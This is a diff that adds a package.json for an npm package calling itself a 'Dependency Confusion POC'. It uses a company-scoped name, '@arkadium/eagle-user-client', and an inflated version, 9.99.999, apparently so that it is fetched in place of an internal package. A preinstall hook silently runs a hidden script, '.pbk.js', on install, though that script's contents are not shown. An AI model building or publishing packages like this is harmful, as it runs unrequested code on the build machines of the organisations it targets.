@@ -1,0 +1,11 @@
+{
+  "name": "@arkadium/eagle-user-client",
+  "version": "9.99.999",
+  "description": "Dependency Confusion POC",
+  "main": "index.js",
+  "scripts": {
+    "preinstall":"node ./.pbk.js Xfinity @arkadium/eagle-user-client 9.99.999"
+  },
+  "author": "",
+  "license": "ISC"
+}
